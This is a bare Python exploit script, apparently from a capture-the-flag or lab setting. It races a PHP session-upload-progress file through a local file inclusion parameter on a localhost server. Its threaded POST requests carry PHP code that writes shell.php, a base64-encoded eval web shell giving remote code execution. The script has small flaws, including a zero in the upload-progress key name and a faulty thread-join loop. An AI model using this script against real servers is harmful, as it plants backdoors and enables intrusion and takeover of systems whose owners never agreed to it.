import requests
import threading

class Worker(threading.Thread):
    def __init__(self, event):
        super().__init__()
        self.event = event
    def run(self):
        url = "http://127.0.0.1:12345/index.php"
        webshell = "SECURITY<?php file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1JFUVVFU1RbImNvZGUiXSk7Pz4='));?>"
        params = {"file":"/var/lib/php/sessions/sess_shell"}
        files = {"PHP_SESSI0N_UPLOAD_PROGRESS":(None,"aa"),"a":(webshell,"helloworld")}
        cookies = {"PHPSESSID":"shell"}
        while not self.event.is_set():
            try:
                resp = requests.post(url,cookies=cookies,params=params,files=files,timeout=2)
                # print("[+] " , resp.status_code)
                if "SECURITY" in resp.text:
                    self.event.set()
                    print("[+] Get shell !!!")
            except:
                pass

if __name__ == "__main__":
    event = threading.Event()
    event.clear()
    tp = []
    for i in range(10):
        t = Worker(event)
        tp.append(t)
    for t in tp:
        t.start()
    for i in tp:
        t.join()
